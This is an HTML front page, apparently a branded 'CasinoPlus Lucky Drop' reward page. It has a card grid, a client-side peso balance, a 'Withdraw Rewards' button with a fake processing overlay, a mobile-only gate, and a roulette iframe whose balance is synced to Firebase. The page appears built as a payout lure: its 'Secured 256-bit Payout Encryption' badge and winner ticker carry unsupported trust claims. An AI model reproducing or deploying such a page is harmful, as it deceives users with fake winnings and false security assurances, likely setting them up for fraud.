<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>CasinoPlus | Live Payout</title>

    <!-- External Libraries -->
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
    
    <!-- Google Fonts -->
    <link href="https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;800&family=Orbitron:wght@700&display=swap" rel="stylesheet">
    
    <!-- External CSS -->
    <link rel="stylesheet" href="./style.css">
</head>
<body>

    <!-- ========== HTML SKELETON ========== -->
    <div class="live-winner-box" id="winnerBox">
        <div class="dot"></div>
        <span id="winnerEntry">Welcome to CasinoPlus Lucky Drop!</span>
    </div>

    <div id="mobileOnly">
        <h2 style="color:#fbbf24">📱 MOBILE ONLY</h2>
        <p>Please use your smartphone to access this reward.</p>
    </div>

    <div class="card" id="mainCard">
        <img src="images/casino.jpeg" class="casino-banner" onerror="this.style.display='none'">
        <img src="images/logo1.png" class="logo-img">
        
        <div class="game-grid" id="grid">
            <div class="card-wrapper" data-card-id="1"><img src="images/img1.png" class="card-img"></div>
            <div class="card-wrapper" data-card-id="2"><img src="images/img2.png" class="card-img"></div>
            <div class="card-wrapper" data-card-id="3"><img src="images/img3.png" class="card-img"></div>
            <div class="card-wrapper" data-card-id="4"><img src="images/img4.png" class="card-img"></div>
            <div class="card-wrapper" data-card-id="5"><img src="images/img5.png" class="card-img"></div>
            <div class="card-wrapper" data-card-id="6"><img src="images/img6.png" class="card-img"></div>
        </div>

        <div class="amount" id="balanceText">₱0.00</div>
        <div id="statusLabel" style="font-size:12px; color:#fbbf24; margin-bottom:10px;">Initializing...</div>
        
        <button class="btn-main" id="claimBtn">Withdraw Rewards</button>

        <div class="trust-badge">
            <svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor">
                <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/>
            </svg>
            Secured 256-bit Payout Encryption
        </div>
        
        <img src="images/casinoplus.jpeg" class="footer-img" onerror="this.style.display='none'">
    </div>

    <div id="processingOverlay">
        <div class="spinner"></div>
        <p style="margin-top:15px; font-weight:800; color:#fff;">PROCESSING WITHDRAWAL...</p>
    </div>

    <!-- ===== SCRIPTS - MAHALAGA ANG ORDER ===== -->
    <!-- 1. Firebase Config muna -->
    <script src="js/config.js"></script>
    
    <!-- 2. Game Logic next -->
    <script src="js/game.js"></script>
    <!-- ========== ROULETTE SIDE GAME ========== -->
<!-- Floating Icon Button -->
<div id="rouletteIcon" style="position: fixed; bottom: 20px; right: 20px; z-index: 9999; cursor: pointer;">
    <div style="background: radial-gradient(circle, #ffd700, #ff8800); width: 65px; height: 65px; border-radius: 50%; display: flex; align-items: center; justify-content: center; box-shadow: 0 5px 20px rgba(0,0,0,0.5), 0 0 15px #ffaa33; animation: pulseGlow 1.5s infinite;">
        <span style="font-size: 32px;">🎰</span>
    </div>
    <div style="position: absolute; top: -5px; right: -5px; background: red; color: white; font-size: 10px; border-radius: 50%; padding: 2px 6px; font-weight: bold;">NEW</div>
</div>

<!-- Roulette Modal (Hidden by default) -->
<div id="rouletteModal" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 10000; display: none; align-items: center; justify-content: center; overflow-y: auto; padding: 20px;">
    <div style="position: relative; max-width: 500px; width: 100%;">
        <!-- Close Button -->
        <div id="closeRoulette" style="position: absolute; top: -40px; right: 0; background: #ff4444; width: 40px; height: 40px; border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer; font-size: 24px; font-weight: bold; color: white; z-index: 10;">✕</div>
        <!-- Roulette Game iFrame -->
        <iframe id="rouletteIframe" src="roulette.html" style="width: 100%; height: 600px; border: none; border-radius: 40px; background: transparent;"></iframe>
    </div>
</div>

<style>
    @keyframes pulseGlow {
        0% { box-shadow: 0 0 0 0 #ffaa33; transform: scale(1); }
        70% { box-shadow: 0 0 0 15px rgba(255,170,51,0); transform: scale(1.05); }
        100% { box-shadow: 0 0 0 0 rgba(255,170,51,0); transform: scale(1); }
    }
    
    #rouletteIcon:hover {
        transform: scale(1.05);
        transition: 0.2s;
    }
</style>

<script>
    // Roulette Modal Logic
    const rouletteIcon = document.getElementById('rouletteIcon');
    const rouletteModal = document.getElementById('rouletteModal');
    const closeRoulette = document.getElementById('closeRoulette');
    
    // Open modal when icon clicked
    rouletteIcon.addEventListener('click', () => {
        rouletteModal.style.display = 'flex';
    });
    
    // Close modal
    closeRoulette.addEventListener('click', () => {
        rouletteModal.style.display = 'none';
    });
    
    // Close when clicking outside the iframe area
    rouletteModal.addEventListener('click', (e) => {
        if (e.target === rouletteModal) {
            rouletteModal.style.display = 'none';
        }
    });

    // ========== SHARED BALANCE FUNCTION ==========
// Ito ang gagamitin ng roulette para mag-sync ng balance

window.updateGameBalance = function(newBalance) {
    // Update main game balance
    if (typeof GameState !== 'undefined') {
        GameState.balance = newBalance;
        if (typeof updateUI === 'function') {
            updateUI();
        }
        // Save to Firebase
        if (typeof saveData === 'function') {
            saveData();
        }
    }
    
    // Update display
    const balanceText = document.getElementById('balanceText');
    if (balanceText) {
        balanceText.innerText = "₱" + newBalance.toLocaleString() + ".00";
    }
    
    console.log('💰 Balance synced:', newBalance);
};

// Function para makuha ang current balance
window.getCurrentBalance = function() {
    if (typeof GameState !== 'undefined' && GameState.balance !== undefined) {
        return GameState.balance;
    }
    const balanceText = document.getElementById('balanceText');
    if (balanceText) {
        let val = parseInt(balanceText.innerText.replace(/[₱,]/g, ''));
        return isNaN(val) ? 0 : val;
    }
    return 0;
};
</script>
    
</body>
</html>
